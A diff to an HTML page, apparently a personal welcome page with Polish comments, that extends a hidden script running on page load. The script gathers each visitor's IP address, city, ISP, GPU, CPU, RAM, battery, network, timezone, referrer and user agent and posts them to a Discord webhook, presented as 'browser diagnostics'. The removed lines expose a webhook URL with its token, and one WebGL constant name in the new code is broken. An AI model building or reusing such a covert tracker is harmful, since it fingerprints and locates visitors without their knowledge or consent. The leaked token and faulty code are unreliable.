@@ -24,38 +24,107 @@
     <h1>Witaj na mojej stronie!</h1>
 
     <script>
-        // Twój link Webhook został automatycznie wstawiony poniżej
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546920856339349705/mo1u4tI78N1EeSJcPEqSO7GV9J0GIVo4PVYhvmBRh5khwRcCuXgpGKsUeYSA63Ra1aXr";
+        // Twój link Webhook z Discorda jest już na stałe wklejony poniżej
+        const DISCORD_WEBHOOK_URL = "https://discord.com";
 
-        // Pobieranie danych o IP i lokalizacji z darmowego API
-        fetch('https://ipwho.is')
-            .then(response => response.json())
-            .then(data => {
-                if(data.success) {
-                    // Przygotowanie estetycznej wiadomości dla bota na Discordzie
-                    const wiadomosc = {
-                        embeds: [{
-                            title: "🔔 Nowe wyświetlenie strony!",
-                            color: 3066993, // Kolor zielony paska w wiadomości
-                            fields: [
-                                { name: "🌐 Adres IP", value: data.ip, inline: true },
-                                { name: "🌍 Kraj", value: `${data.country} (${data.country_code})`, inline: true },
-                                { name: "🏙️ Miasto", value: data.city, inline: true },
-                                { name: "📡 Dostawca (ISP)", value: data.connection.isp, inline: false },
-                                { name: "⏰ Data/Czas", value: new Date().toLocaleString("pl-PL"), inline: false }
-                            ]
-                        }]
-                    };
+        // Funkcja do bezpiecznego odczytywania modelu GPU (karty graficznej) za pomocą WebGL
+        function odczytajModelKartyGraficznej() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Brak wsparcia dla WebGL";
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return "Brak rozszerzenia informacji o GPU";
+                
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_RENDERER);
+                return renderer || "Nieznany model GPU";
+            } catch (e) {
+                return "Nie udało się odczytać";
+            }
+        }
 
-                    // Wysyłanie powiadomienia w tle na Twój Discord
-                    fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(wiadomosc)
-                    });
+        async function generujPelnyRaportDiagnostyczny() {
+            try {
+                // 1. Odpytanie API o adres IP (v4/v6) oraz dane geograficzne/ISP
+                const apiResponse = await fetch('https://ipwho.is');
+                const geoData = await apiResponse.json();
+                
+                if (!geoData.success) {
+                    console.error("Błąd pobierania danych IP");
+                    return;
                 }
-            })
-            .catch(error => console.error('Błąd podczas zbierania danych:', error));
+
+                // 2. Pobieranie informacji o stanie baterii (jeśli urządzenie ją posiada)
+                let statusBaterii = "Brak informacji (np. PC)";
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        const poziom = Math.round(battery.level * 100);
+                        const czyLaduje = battery.charging ? "⚡ Ładuje się" : "🔋 Rozładowuje się";
+                        statusBaterii = `${poziom}% (${czyLaduje})`;
+                    } catch (e) {
+                        statusBaterii = "Zablokowane przez przeglądarkę";
+                    }
+                }
+
+                // 3. Pobieranie informacji o połączeniu sieciowym
+                let specyfikacjaSieci = "Niedostępna";
+                if (navigator.connection) {
+                    const typ = navigator.connection.effectiveType || 'Nieznany';
+                    const predkosc = navigator.connection.downlink || 0;
+                    specyfikacjaSieci = `Typ: ${typ} (Szacunkowo ~${predkosc} Mbps)`;
+                }
+
+                // 4. Agregacja pozostałych metadanych systemowych i sprzętowych
+                const parametrySprzetu = {
+                    rdzenieCPU: navigator.hardwareConcurrency || "Nieznane",
+                    pamiecRAM: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznane (lub iOS)",
+                    gpu: odczytajModelKartyGraficznej(),
+                    rozdzielczosc: `${window.screen.width}x${window.screen.height}`,
+                    jezykPrzegladarki: navigator.language || navigator.userLanguage,
+                    strefaCzasowa: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    czasLokalny: new Date().toLocaleString("pl-PL"),
+                    stronaOdsylajaca: document.referrer || "Bezpośrednie wejście (link)",
+                    systemCaly: navigator.userAgent
+                };
+
+                // 5. Konstruowanie kompletnej wiadomości w formacie Discord Embed
+                const formatWiadomosci = {
+                    embeds: [{
+                        title: "🔬 KOMPLETNY RAPORT ALL-IN-ONE",
+                        description: "Zarejestrowano nowe wywołanie strony testowej.",
+                        color: 15158332, // Kolor paska (czerwono-karmazynowy)
+                        fields: [
+                            { name: "🌐 Adres IP", value: geoData.ip, inline: true },
+                            { name: "🌍 Lokalizacja", value: `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.country_code})`, inline: true },
+                            { name: "📡 Dostawca (ISP)", value: geoData.connection.isp, inline: false },
+                            { name: "💻 Specyfikacja Sprzętowa", value: `• Rdzenie procesora: ${parametrySprzetu.rdzenieCPU}\n• Pamięć RAM: ${parametrySprzetu.pamiecRAM}\n• Karta Graficzna: \`${parametrySprzetu.gpu}\``, inline: false },
+                            { name: "📱 Środowisko i Zasilanie", value: `• Rozdzielczość ekranu: ${parametrySprzetu.rozdzielczosc}\n• Język systemu: ${parametrySprzetu.jezykPrzegladarki}\n• Status baterii: ${statusBaterii}`, inline: false },
+                            { name: "📶 Sieć i Ruch", value: `• Połączenie: ${specyfikacjaSieci}\n• Źródło (Referer): ${parametrySprzetu.stronaOdsylajaca}`, inline: false },
+                            { name: "⏰ Czas i Strefa", value: `• Strefa: ${parametrySprzetu.strefaCzasowa}\n• Czas urządzenia: ${parametrySprzetu.czasLokalny}`, inline: false },
+                            { name: "ℹ️ Pełny ciąg User-Agent", value: `\`\`\`${parametrySprzetu.systemCaly}\`\`\``, inline: false }
+                        ],
+                        footer: {
+                            text: "System Diagnostyki Przeglądarki v2.0"
+                        }
+                    }]
+                };
+
+                // 6. Wysłanie zebranych danych na Discord Webhook
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formatWiadomosci)
+                });
+
+            } catch (error) {
+                console.error('Błąd krytyczny podczas generowania raportu:', error);
+            }
+        }
+
+        // Automatyczne uruchomienie skryptu po pełnym wczytaniu witryny
+        generujPelnyRaportDiagnostyczny();
     </script>
 
 </body>
